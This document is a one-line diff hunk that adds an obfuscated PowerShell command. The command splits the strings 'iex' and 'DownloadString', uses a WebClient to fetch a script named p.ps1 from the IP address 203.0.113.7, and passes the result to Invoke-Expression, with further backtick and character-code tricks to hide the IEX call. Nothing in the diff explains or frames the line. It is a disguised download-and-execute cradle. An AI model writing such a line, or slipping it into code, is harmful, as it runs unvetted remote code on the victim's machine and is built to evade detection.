@@ -1,0 +1,1 @@
+&('i'+'ex') (New-Object Net.WebClient).('Download'+'String')('http://203.0.113.7/p.ps1');I`E`X ([char]73+[char]69+[char]88)
